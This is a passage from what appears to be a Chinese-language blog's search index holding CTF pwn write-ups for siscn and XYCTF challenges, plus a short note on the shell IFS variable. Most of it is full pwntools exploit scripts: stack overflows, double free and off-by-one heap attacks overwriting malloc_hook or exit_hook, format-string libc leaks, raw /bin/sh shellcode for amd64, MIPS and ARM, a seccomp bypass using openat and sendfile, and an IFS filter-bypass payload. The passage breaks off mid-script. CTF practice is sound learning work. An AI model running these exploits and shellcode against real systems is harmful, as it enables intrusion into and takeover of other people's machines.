[数值] 或 --lines=[数值]：显示文件开始的指定行数。例如，head -n 5 file.txt 会显示 file.txt 的前 5 行。\",\"-c [数值] 或 --bytes=[数值]：显示文件开始的指定字节数。例如，head -c 100 file.txt 会显示 file.txt 的前 100 个字节。\",\"-q 或 --quiet：在处理多个文件时不打印每个文件的名称作为头部。\",\"-v 或 --verbose：总是打印每个文件的名称作为头部。\",\"5、tail命令—用于查看文件的后几行内容，默许情况下显示文件的最后10行。 6、nl命令—用于在文件中加上行号，便于查看和编辑文件。 7、vi/vim命令—是一种文本编辑器，可以用于查看和编辑文件内容，适用于高级用户。\"]},\"465\":{\"h\":\"IFS变量\",\"t\":[\"这里提到IFS作为Shell的内置变量，是一个用于分割字段的字符列表\"]},\"466\":{\"h\":\"IFS 的工作原理\",\"t\":[\"IFS 是一个特殊的 shell 变量，用于定义字段边界。它告诉 shell 如何解释序列和字段分隔符。这对于文本解析、命令行参数处理以及读取和解析数据至关重要。\",\"默认情况下，IFS 包含空格、制表符和换行符。这意味着 shell 在处理文本时会将这些字符视为字段之间的分隔符。\",\"更改 IFS 的值可以改变 shell 解释数据的方式。这特别有用于处理非标准格式的数据。\"]},\"467\":{\"h\":\"这里举列子:\",\"t\":[\"IFS=',' line=\\\"apple,banana,cherry\\\" for fruit in $line; do echo $fruit done # 输出：apple banana cherry \"]},\"468\":{\"h\":\"payload\",\"t\":[\"head$IFS$1flag\"]},\"469\":{\"h\":\"siscn_pwn1(栈迁移+float数据格式)\",\"t\":[\"看一下题发现应该是比较简单的 由于有个gets函数 所以我有点想直接覆盖数据为11.28125\",\"int func() { char v1[44]; // [rsp+0h] [rbp-30h] BYREF float v2; // [rsp+2Ch] [rbp-4h] v2 = 0.0; puts(\\\"Let's guess the number.\\\"); gets(v1); if ( v2 == 11.28125 ) return system(\\\"cat /flag\\\"); else return puts(\\\"Its value should be 11.28125\\\"); } \",\"保护\",\"[*] '/home/agentalbrazee/work/ctf/pwn/cp/nssctf/pwn1/pwn1' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) \"]},\"470\":{\"h\":\"实验float的存储数据\",\"t\":[\"为了实验一下 我们手搓一个程序 gdb调试一下\",\"#include<stdio.h> int main() { float a; a = 11.28125; printf(\\\"The value of a is %f\\\\n\\\",a); } \",\"获取结果:\",\"► 0x5555555551c7 <main+62> call __isoc99_scanf@plt <__isoc99_scanf@plt> format: 0x555555556004 ◂— 0x7620656854006625 /* '%f' */ vararg: 0x7fffffffdee4 ◂— 0xc7df9b0041348000 \",\"那么我们就知道了 这里的存储数据为0xc7df9b0041348000\",\"但是好像显然不太对所以我们这里干脆用idapython在ida里面提取出来\",\"int __cdecl main(int argc, const char **argv, const char **envp) { float v4; // [rsp+2Ch] [rbp-4h] BYREF _main(argc, argv, envp); v4 = 11.28125; scanf(\\\"%f\\\", &v4); printf(\\\"The value of a is %f\\\\n\\\", v4); return 0; } \",\"然后在scanf里面下idapython脚本:\",\"import idc print(\\\"rax\\\",hex(idc.get_reg_value(\\\"rax\\\"))) \",\"获取数据:rax 0x61fe1c 好像还是不太对\",\"(太笨了)最后我们直接在程序源代码重找cmp的部分找到了\",\".rodata:00000000004007F4 00 80 34 41 dword_4007F4 dd 41348000h \"]},\"471\":{\"h\":\"尝试覆盖\",\"t\":[\"from pwn import * # r = remote(\\\"node5.anna.nssctf.cn\\\",28355) r = gdb.debug(\\\"./pwn1\\\",\\\"b main\\\") print(r.recvuntil(b\\\"Let's guess the number.\\\\n\\\")) payload = b\\\"a\\\"*(0x30 - 4) +p32(0x41348000) r.sendline(payload) r.interactive() \",\"最后成功\"]},\"472\":{\"h\":\"PWN\"},\"473\":{\"h\":\"BabyGift\",\"t\":[\"image-20240422202855033\",\"利用这里会让字符串地址赋值给rdi 然后我们通过劫持程序流程跑到printf处 利用格式化字符串漏洞就能泄露libc地址 然后触发system函数\",\"from pwn import * # context(os='linux', arch='amd64', log_level='debug') # context(os='linux', arch='amd64') # context.terminal = ['byobu', 'sp', '-h'] file_name = \\\"./vuln\\\" url = \\\"127.0.0.1\\\" port = 64472 elf = ELF(file_name) # p= process(file_name) # p = gdb.debug(file_name,\\\"b *Menu+113\\\") p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) pop_rbp = p64(0x4012D0) lea_rax = p64(0x4012A0 ) bss = p64(0x404020+0x200) sub_rsp = p64(0x4012DC) ret = p64(0x40101a) mov_rax_0_pop_rbp = p64(0x4012CB) mov_rax_printf = p64(0x401202) ru(b\\\"Your name:\\\\n\\\") sl(b\\\"elegy\\\") ru(b\\\"Your passwd:\\\\n\\\") payload = b\\\"%27$p%11$p\\\".ljust(0x20,b\\\"a\\\")+p64(0x404020+0x100)+mov_rax_printf +p64(0x40122D)*2 sd(payload) res = rl() libc_base = int(res[:14],16) -128 -0x29DC0 stack_addr = int(res[14:28],16) print(\\\"stack_addr\\\",hex(stack_addr)) system_addr = 0x50D70 +libc_base print(hex(libc_base)) ru(b\\\"Your name:\\\\n\\\") sl(b\\\"elegy\\\") ru(b\\\"Your passwd:\\\\n\\\") payload = b\\\"/bin/sh\\\\x00\\\".ljust(0x28,b\\\"a\\\") +ret+p64(system_addr) sl(payload) ia() \"]},\"474\":{\"h\":\"fastfastfast\",\"t\":[\"简单的堆题 free的时候没有做任何检测 直接double free 然后通过指向bss表中 泄露出标准io地址从而推算出libc地址\",\"image-20240422211524070\",\"double free后任意地址malloc\",\"image-20240422211447696\",\"bss段标准输入输出流io地址信息\",\"image-20240422211628353\",\"通过在gdb中输入libc获取libc基础地址来算和io之间的地址偏差\",\"image-20240422211647867\",\"算一下偏差就可以了\",\"然后通过第二次double free 修改malloc hook 为onegadget即可\"]},\"475\":{\"h\":\"脚本\",\"t\":[\"from pwn import * # context(os='linux', arch='mips',endian=\\\"little\\\", log_level='debug') context(os='linux', arch='amd64', log_level='debug') # context(os='linux', arch='amd64') context.terminal = ['byobu', 'sp', '-h'] file_name = \\\"./vuln\\\" url = \\\"\\\" port = 1111 elf = ELF(file_name) # p= process(file_name) p = gdb.debug(file_name,\\\"b *main+42\\\") # p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) def Menu(index): ru(b\\\">>> \\\") sl(index) def create(index,content): Menu(b\\\"1\\\") ru(b\\\"please input note idx\\\\n\\\") sl(str(index).encode()) ru(b\\\"please input content\\\\n\\\") sd(content) print(f\\\"创建了一个index:{index}的chunk\\\") def delete(index): Menu(b\\\"2\\\") ru(b\\\"please input note idx\\\\n\\\") sl(str(index).encode()) print(f\\\"删除一个index:{index}的chunk\\\") def show(index): Menu(b\\\"3\\\") ru(b\\\"please input note idx\\\\n\\\") sl(str(index).encode()) return rc(0x68) #构造double free for i in range(9): create(i,chr(0x61+i).encode()*0x68) for i in range(9): delete(i) delete(7) for i in range(7): create(i,chr(0x61+i).encode()) got_addr = 0x401050 bss_addr = 0x404070 # 控制fd 指向我们想要malloc的地址 create(7,p64(bss_addr)) create(8,b\\\"aaaaaaaa\\\") create(9,b\\\"a\\\") # 控制bss_addr段 create(10,p64(bss_addr)) print(\\\"开始泄露\\\") res = show(10) # print(\\\"res\\\",u64(res[16:24])) #算出libc libc_base = u64(res[16:24]) - 2021024 system_addr = libc_base + 0xe3b31 malloc_hook = libc_base + (0x7f291e7a2b70-0x7f291e5b6000 ) print(\\\"libc_base:\\\",hex(libc_base)) print(\\\"malloc_hook:\\\",hex(malloc_hook)) print(\\\"system_addr:\\\",hex(system_addr)) print(\\\"成功泄露\\\") #第二次double free for i in range(9): create(i,b\\\"aaaaaaaa\\\"*2) for i in range(9): delete(i) print(\\\"两个fastbin情况\\\") # input(\\\"e\\\") delete(7) print(\\\"构造double free\\\") for i in range(7): create(i,b\\\"aaaaaaaa\\\"*2) print(\\\"tcache删除完毕\\\") # 修改malloc_hook create(8,p64(malloc_hook )) create(9,p64(0x0)) print(\\\"malloc_hook:\\\",hex(malloc_hook)) print(\\\"system_addr:\\\",hex(system_addr)) create(10,p64(system_addr)) create(11,p64(system_addr)) create(12,b\\\"a\\\") ia() \"]},\"476\":{\"h\":\"fmt\",\"t\":[\"scanf和fmt类似 有格式化 我们可以通过%n$p来实现指定第几个参数地址写入内容 然后前六个参数都是寄存器 后面的参数就是栈地址了 按照栈顶依次选择\",\"这题我们拥有两次写入机会 我们可以第一次写入目标地址 然后第二次通过scanf来向目标地址写入数据\",\"我们选择打exit_hook 写入one_gadget 就可以成功劫持了\"]},\"477\":{\"h\":\"exit hook地址写入栈:\",\"t\":[\"image-20240422212450209\"]},\"478\":{\"h\":\"选择\",\"t\":[\"%7$ld \"]},\"479\":{\"h\":\"脚本\",\"t\":[\"from pwn import * context(os='linux', arch='amd64', log_level='debug') # context(os='linux', arch='amd64') context.terminal = ['byobu', 'sp', '-h'] # file_name = \\\"./vuln\\\" url = \\\"127.0.0.1\\\" port = 53235 # elf = ELF(file_name) # p= process(file_name) # p = gdb.debug(file_name,\\\"b main\\\") p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) res = ru(b\\\"\\\\n\\\") printf_addr = int(res[-15:-1],16) print(\\\"printf_addr:\\\",hex(printf_addr)) libc_base = printf_addr - 0x61CC0 print(\\\"libc_base:\\\",hex(libc_base)) exit_hook_addr = libc_base +2240352+8 exit_hook_args_addr = libc_base +2238824 system_addr = libc_base +0x522C0 one_gadget = libc_base +0xe3b2e print(\\\"exit_hook:\\\",hex(exit_hook_addr)) print(\\\"exit_hook args\\\",hex(exit_hook_args_addr)) print(\\\"system_addr:\\\",hex(system_addr)) print(\\\"one_gadget:\\\",hex(one_gadget)) # cannary-8位置 cannary = libc_base +2045376+0x28 -0x8 print(\\\"cannary:\\\",hex(cannary)) # %7$d 就是rsp+8 # 第一次构造 # payload = b\\\"%64s%13$s\\\".ljust(0x8,b\\\"a\\\")+p64(cannary)*3 payload =b\\\"%7$ld\\\".ljust(8,b\\\"\\\\x00\\\")+p64(exit_hook_addr) # payload =b\\\"%13$s\\\" sd(payload) payload=str(one_gadget).encode() input(\\\":\\\") # payload = b\\\"d\\\"*0x38+p64(cannary)+b\\\"c\\\".ljust(32,b\\\"c\\\") sl(payload) ia() \"]},\"480\":{\"h\":\"GuestBook\",\"t\":[\"存在栈的off_by_one漏洞 我们通过提前在栈里面写满backdoor地址 然后通过修改返回地址最后一个字节 来实现栈迁移返回到存放backdoor的栈地址上 只要写满了 概率还挺大 然后就可以在第二次返回的时候触发backdoor函数\",\"image-20240422213216922\",\"import time from pwn import * context(os='linux', arch='amd64', log_level='debug') # context(os='linux', arch='amd64') context.terminal = ['byobu', 'sp', '-h'] file_name = \\\"./vuln\\\" url = \\\"xyctf.top\\\" port = 34019 # elf = ELF(file_name) # p= process(file_name) # p = gdb.debug(file_name,\\\"b *0x401321\\\") p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) def add(index,name,id): ru(b\\\"index\\\\n\\\") sl(str(index).encode()) ru(b\\\"name:\\\\n\\\") sd(name) ru(b\\\"id:\\\\n\\\") sl(id) backdoor = 0x40133A for i in range(0,31): add(i,p64(backdoor)*2,b\\\"0\\\") add(32,b\\\"\\\\x3a\\\\x13\\\\x40\\\",b\\\"48\\\") ru(b\\\"index\\\\n\\\") sl(b\\\"-1\\\") ru(b\\\"Have a good time!\\\\n\\\") time.sleep(2) sd(b\\\"ls\\\") # print(rl()) ia() \"]},\"481\":{\"h\":\"hello_world\",\"t\":[\"两次栈溢出 第一次泄露libc 第二次直接劫持程序流程one_gadget\",\"from pwn import * context(os='linux', arch='amd64', log_level='debug') # context(os='linux', arch='amd64') context.terminal = ['byobu', 'sp', '-h'] file_name = \\\"./vuln\\\" url = \\\"xyctf.top\\\" port = 35494 elf = ELF(file_name) # p= process(file_name) # p = gdb.debug(file_name,\\\"b main\\\") p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) ru(b\\\"please input your name: \\\") sd(b\\\"a\\\"*0x28+b\\\"\\\\x91\\\") result = rl()[-7:-1] baselibc = u64(result.ljust(8,b\\\"\\\\x00\\\")) +47 -0x29DC0 print(result) print(hex(baselibc)) ru(b\\\"please input your name: \\\") rb= p64(0x2072+0x78+baselibc) sd(b\\\"a\\\"*0x20+p64(0)+p64(0x50a47+baselibc)) ia() \"]},\"482\":{\"h\":\"Intermittent\",\"t\":[\"一次性4字节shellcode空间\",\"本来想的是每次用两字节操作两字节跳转到下一个可执行区域 发现不太现实\",\"然后发现跳转到执行shellcode的地方的时候寄存器上已经几乎布置好了一些我们需要的值\",\"image-20240422214330654\",\"image-20240422214400338\",\"我们可以利用rep movsb指令 这个指令可以让rsi寄存器的地址开始rcx的字节数据赋值给rdi地址所指的区域 我们可以发现rdx已经有了我们执行shellcode的地址 然后rsi就是我们输入的字符串地址 我们只需要让rdx寄存器的值给rdi 然后触发rep movsb即可 就可以实现shellcode的写入\",\"rep movsb是两字节 我们用栈传递参数让rdx赋值给rdi 两字节 刚好四字节 那么我们字符串后面填上getshell的shellcode即可\",\"from pwn import * context(os='linux', arch='amd64', log_level='debug') # context(os='linux', arch='amd64') context.terminal = ['byobu', 'sp', '-h'] file_name = \\\"./vuln\\\" url = \\\"\\\" port = 1111 elf = ELF(file_name) # p= process(file_name) p = gdb.debug(file_name,\\\"b *main+273\\\") # p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) ru(b\\\"show your magic: \\\") shellcode1 = b'\\\\x52\\\\x5F\\\\xF3\\\\xA4' # nop指令不重要 shellcode2 = b'\\\\x90'*4 shellcode3 = b'\\\\x90'*4 shellcode = shellcode1 +b\\\"\\\\x31\\\\xf6\\\\x48\\\\xbb\\\\x2f\\\\x62\\\\x69\\\\x6e\\\\x2f\\\\x2f\\\\x73\\\\x68\\\\x56\\\\x53\\\\x54\\\\x5f\\\\x6a\\\\x3b\\\\x58\\\\x31\\\\xd2\\\\x0f\\\\x05\\\" sd(shellcode.ljust(0x100,b\\\"\\\\x90\\\")) ia() \"]},\"483\":{\"h\":\"inviisible_flag\",\"t\":[\"禁止了orw的orw 我们直接使用平替函数 新建标签页 (mebeim.net)推荐这个网站进行查看有哪些函数和传参规范\",\"先开始想复杂了 想成了利用retfq来转化为32位绕过open等函数的禁止 参考强网杯的shellcode第五届强网杯 Pwn - shellcode - Bugku CTF还是学到了东西 甚至去想办法触发新的mmap函数来获取一个低地址的可执行区域 然后把shellcode copy过去执行 因为refq不支持跳转超过四字节的地址 结果发现想复杂了 这里保留了原本的构思代码\",\"tips:sendfile64(调用号:0x28)可以直接让一个文件描述符的内容输出到另一个文件描述符上非常适合平替这次的write函数\",\"from pwn import * context(log_level='debug') context(os='linux') context.terminal = ['byobu', 'sp', '-h'] # shellcode_copy = asm( # ''' # copy_loop: # cmp rcx, 0 # je end_copy # mov al, [rsi] # mov [rdi], al # inc rsi # inc rdi # dec rcx # jmp copy_loop # end_copy: # ''' # ,arch=\\\"amd64\\\") file_name = \\\"./vuln\\\" url = \\\"xyctf.top\\\" port =35002 elf = ELF(file_name) # p= process(file_name) # p = gdb.debug(file_name,\\\"b *main+181\\\") # b 0x114514061 # p = gdb.debug(file_name,\\\"b *0x114514061\\\") p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) # ru(b\\\"show your magic again\\\\n\\\") # # retfq 等效为 # # pop IP # # pop CS # # retfq无法跳转4字节以上的地址 # # 尝试fork一个新进程 # # puts函数 # # 0x114514000 # # \\\\x00 \\\\x40 \\\\x51 \\\\x13 cs:\\\\x01 # # eip rip cs:ip # # retfq ->cs位0x23 ip # # mov rax,[rbp+24] # # add rax,80 # # jmp rax # # 0x11451404d ->0x14514000 57次 # # # # b *0x114514061 # shellcode = asm(''' # mov r9d,0x0 # mov r8d,0xffffffff # mov ecx,0x22 # mov edx,0x7 # mov esi,0x1000 # movabs rax,0x14514000 # mov rdi,rax # mov rax,[rbp+24] # sub rax,647 # call rax # ''',arch=\\\"amd64\\\") # # 将内容赋值过去 # shellcode += asm( # ''' # mov rsi,0x11451406a; # mov rdi,0x14514000; # mov rcx,456 # copy_loop: # cmp rcx, 0 # je end_copy ; # mov al, [rsi] ; # mov [rdi], al ; # inc rsi ; # inc rdi ; # dec rcx ; # jmp copy_loop ; # end_copy: # mov rax,0x14514000 # jmp rax # ''' # ,arch=\\\"amd64\\\") # # 转化为32位 # shellcode +=asm( # ''' # push 0x23 # push 0x14514009 # retfq # ''' # ,arch=\\\"amd64\\\") # # 构造栈 # shellcode += asm( # ''' # mov esp,0x14514400 # mov ebp,0x14514420 # ''' # ,arch=\\\"i386\\\") # # 调用open函数 # shellcode += asm( # ''' # xor eax, eax ; # mov eax,0x5 ; # push 0x00006761; # push 0x6c662f2e; # mov ebx,esp; # mov edi,esp; # mov ecx, 0; # int 0x80; # ''',arch=\\\"i386\\\") # # read # shellcode += asm( # ''' # mov ebx,3; # mov ecx,esp; # mov edx,0x20; # mov eax,0x3; # int 0x80; # ''' # ,arch=\\\"i386\\\") # # write # shellcode +=asm( # ''' # mov ebx,1; # mov ecx,esp; # mov edx,0x20; # mov eax,0x4; # int 0x80; # ''' # ,arch=\\\"i386\\\") # payload = shellcode # payload = payload.ljust(0x160,b'\\\\x00') # payload += b\\\"\\\\x00\\\\x00./flag\\\\x00\\\\x00\\\\x00\\\" # print(payload) # sd(payload) # ru(b\\\"show your magic again\\\\n\\\") # shellcode= asm( # ''' # push 0x23 # ''' # ) # ia() # print(len(asm(shellcode,arch='amd64') ru(b\\\"show your magic again\\\\n\\\") # read函数 and sendfile函数 shellcode = asm( ''' mov rax, 0x67616c662f2e push rax xor rdi, rdi sub rdi, 100 mov rsi, rsp xor edx, edx xor r10, r10 push 0x101 pop rax syscall mov rdi, 1 mov rsi, 3 push 0 mov rdx, rsp mov r10, 0x100 push 0x28 pop rax syscall mov rax,1 ''' ,arch=\\\"amd64\\\") sd(shellcode) ru(b\\\"}\\\") ia() \"]},\"484\":{\"h\":\"malloc_flag\",\"t\":[\"不懂为什么这题就只有30多解\",\"读取了flag而且写入了chunk中再把chunk free了 这个free chunk就进入了tcache 我们直接malloc一个大小一样的chunk 然后输出 就可以获取flag\",\"from pwn import * # context(os='linux', arch='mips',endian=\\\"little\\\", log_level='debug') context(os='linux', arch='amd64', log_level='debug') # context(os='linux', arch='amd64') context.terminal = ['byobu', 'sp', '-h'] file_name = \\\"./vuln\\\" url = \\\"\\\" port = 52689 # elf = ELF(file_name) # p= process(file_name) # p = gdb.debug(file_name,\\\"b *main+516\\\") p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) def recv_menu(): ru(bytearray([0xE8, 0xAF, 0xB7, 0xE8, 0xBE, 0x93, 0xE5, 0x85, 0xA5, 0xE9, 0x80, 0x89, 0xE9, 0xA1, 0xB9, 0x3A, 0x20])) def add(name,size): recv_menu() sl(b\\\"1\\\") # 请输入名字: ru(bytearray([0xE8, 0xAF, 0xB7, 0xE8, 0xBE, 0x93, 0xE5, 0x85, 0xA5, 0xE5, 0x90, 0x8D, 0xE5, 0xAD, 0x97, 0x3A, 0x20])) sl(str(name).encode()) # 请输入大小 (十进制或十六进制): ru(bytearray([0xE8, 0xAF, 0xB7, 0xE8, 0xBE, 0x93, 0xE5, 0x85, 0xA5, 0xE5, 0xA4, 0xA7, 0xE5, 0xB0, 0x8F, 0x20, 0x28, 0xE5, 0x8D, 0x81, 0xE8, 0xBF, 0x9B, 0xE5, 0x88, 0xB6, 0xE6, 0x88, 0x96, 0xE5, 0x8D, 0x81, 0xE5, 0x85, 0xAD, 0xE8, 0xBF, 0x9B, 0xE5, 0x88, 0xB6, 0x29, 0x3A])) sl(str(size).encode()) def delete(name): recv_menu() sl(b\\\"2\\\") ru(bytearray([0xE8, 0xAF, 0xB7, 0xE8, 0xBE, 0x93, 0xE5, 0x85, 0xA5, 0xE8, 0xA6, 0x81, 0xE9, 0x87, 0x8A, 0xE6, 0x94, 0xBE, 0xE7, 0x9A, 0x84, 0xE5, 0x90, 0x8D, 0xE5, 0xAD, 0x97, 0x3A, 0x20])) sl(str(name).encode()) def displayChunks(): recv_menu() sl(b\\\"3\\\") return rl() def displayChunk(name): recv_menu() sl(b\\\"4\\\") # 请输入要查看内容的内存块名字: ru(bytearray([0xE8, 0xAF, 0xB7, 0xE8, 0xBE, 0x93, 0xE5, 0x85, 0xA5, 0xE8, 0xA6, 0x81, 0xE6, 0x9F, 0xA5, 0xE7, 0x9C, 0x8B, 0xE5, 0x86, 0x85, 0xE5, 0xAE, 0xB9, 0xE7, 0x9A, 0x84, 0xE5, 0x86, 0x85, 0xE5, 0xAD, 0x98, 0xE5, 0x9D, 0x97, 0xE5, 0x90, 0x8D, 0xE5, 0xAD, 0x97, 0x3A, 0x20])) sl(str(name).encode()) return rl() add(1,0x100) res = displayChunk(1) print(res) ia() \"]},\"485\":{\"h\":\"EZ1.0?(mips)\",\"t\":[\"白给 一个栈迁移 然后到bss端执行shellcode\",\"本地bss没有可执行权限但是远程有 这题应该麻烦的是搭建mips环境\",\"import time from pwn import * context(os='linux', arch='mips',endian=\\\"little\\\", log_level='debug') context.terminal = ['byobu', 'sp', '-h'] # p = process([\\\"qemu-mipsel\\\", \\\"-g\\\", \\\"12345\\\", \\\"-L\\\", \\\"/usr/mipsel-linux-gnu/\\\", \\\"./mips\\\"]) # pwnlib.qemu.user_path(arch='mips') # pwnlib.qemu.ld_prefix(arch='mips') file_name = \\\"./mips\\\" url = \\\"127.0.0.1\\\" port = 50176 stack_addr = 0x7ffff000 # elf = ELF(file_name) # p= process(file_name) p = remote(url,port) payload=b\\\"b\\\"*0x40+p32(0x493400)+p32(0x400864) p.sendafter(b\\\"welcome XYCTF mips world\\\",payload) pause() payload=b\\\"a\\\"*0x44+p32(0x493460)+b\\\"\\\\x11\\\\x01\\\\x06\\\\x24\\\\xff\\\\xff\\\\xd0\\\\x04\\\\x00\\\\x00\\\\x06\\\\x24\\\\xe0\\\\xff\\\\xbd\\\\x27\\\\x14\\\\x00\\\\xe4\\\\x27\\\\x00\\\\x00\\\\x05\\\\x24\\\\xab\\\\x0f\\\\x02\\\\x24\\\\x0c\\\\x00\\\\x00\\\\x00/bin/sh\\\" p.send(payload) p.interactive() \"]},\"486\":{\"h\":\"EZ2.0?(arm)\",\"t\":[\"和mips一模一样 栈迁移 然后shellcode\",\"from pwn import * # context(os='linux', arch='mips',endian=\\\"little\\\", log_level='debug') context( arch='arm', log_level='debug') # context(os='linux', arch='amd64') context.terminal = ['byobu', 'sp', '-h'] file_name = \\\"./arm\\\" url = \\\"127.0.0.1\\\" port = 57621 elf = ELF(file_name) # p= process(file_name) # p = gdb.debug(file_name,\\\"b vuln\\\") p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) bss = elf.bss() print(\\\"bss:\\\",hex(bss)) ru(b\\\"welcome XYCTF arm world\\\\n\\\") sd(b\\\"a\\\"*0x40+p32(bss+0x100+0x44)+p32(0x10588)) shellcode = b\\\"\\\\x02\\\\x20\\\\x42\\\\xe0\\\\x1c\\\\x30\\\\x8f\\\\xe2\\\" shellcode += b\\\"\\\\x04\\\\x30\\\\x8d\\\\xe5\\\\x08\\\\x20\\\\x8d\\\\xe5\\\" shellcode += b\\\"\\\\x13\\\\x02\\\\xa0\\\\xe1\\\\x07\\\\x20\\\\xc3\\\\xe5\\\" shellcode += b\\\"\\\\x04\\\\x30\\\\x8f\\\\xe2\\\\x04\\\\x10\\\\x8d\\\\xe2\\\" shellcode += b\\\"\\\\x01\\\\x20\\\\xc3\\\\xe5\\\\x0b\\\\x0b\\\\x90\\\\xef\\\" shellcode += b\\\"/bin/sh\\\" print(\\\"shellcode:\\\",shellcode) # input(\\\"test\\\") input(\\\"test\\\") payload = b\\\"a\\\"*0x40+p32(bss+0x100+0x44)+p32( 0x8afc4 )+shellcode sd(payload) ia() \"]},\"487\":{\"h\":\"one_byte\",\"t\":[\"写入chunk的时候多写了一位0 造成one_byte漏洞\",\"通过chunk进入unsortedbin中然后输出fd和bk泄露libc地址\",\"通过chunk进入tcache然后 malloc回来 然后输出chunk内容 泄露heap地址\"]},\"488\":{\"h\":\"劫持freechunk\",\"t\":[\"因为这题用的两个全局变量来存储的使用情况和chunk地址 我们不太方便伪造fake head来实现劫持\",\"因为存在off_by_one漏洞 我们可以利用合并机制 进行修改一些已经进入bin链的chunk 修改其fd 然后我们再通过malloc 就可以实现malloc下来一个任意地址 这里我们选择打malloc hook\",\"大致就是构造一个情况:a b c 三个chunk 然后ac都为unsortedbin chunk b为fastbin chunk然后让ac触发合并机制 把b包含在合并后的大chunk中 我们再将这个大chunk malloc下来 这样我们就可以修改b chunk了\",\"import time from pwn import * # context(os='linux', arch='mips',endian=\\\"little\\\", log_level='debug') # context(os='linux', arch='amd64', log_level='debug') context(os='linux', arch='amd64') context.terminal = ['byobu', 'sp', '-h'] file_name = \\\"./vuln\\\" url = \\\"127.0.0.1\\\" port = 65030 # elf = ELF(file_name) # p= process(file_name) # p = gdb.debug(file_name,\\\"b *main+34\\\") p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) def recv_menu(): ru(b\\\">>> \\\") def debug(): gdb.attach(p,\\\"b *main+34\\\") input(\\\"stop\\\") def add(index,size): recv_menu() sl(b\\\"1\\\") ru(b\\\"[?] please input chunk_idx: \\\") sl(str(index).encode()) ru(b\\\"[?] Enter chunk size: \\\") sl(str(size).encode()) print(\\\"---------------\\\\nadd chunk {}\\\\n---------------\\\".format(index)) def delete(index): recv_menu() sl(b\\\"2\\\") ru(b\\\"[?] please input chunk_idx: \\\") sl(str(index).encode()) print(\\\"---------------\\\\ndelete chunk {}\\\\n---------------\\\".format(index)) def edit(index,content): recv_menu() sl(b\\\"4\\\") ru(b\\\"[?] please input chunk_idx: \\\") sl(str(index).encode()) time.sleep(0.1) sd(content) def view(index,n): recv_menu() sl(b\\\"3\\\") ru(b\\\"[?] please input chunk_idx: \\\") sl(str(index).encode()) return rc(n) for i in range(11): add(i,0x100) for i in range(10): delete(i) # 0-7是占用状态 for i in range(7): add(i,0x100) add(7,0x100) res = view(7,0x10) base_libc = 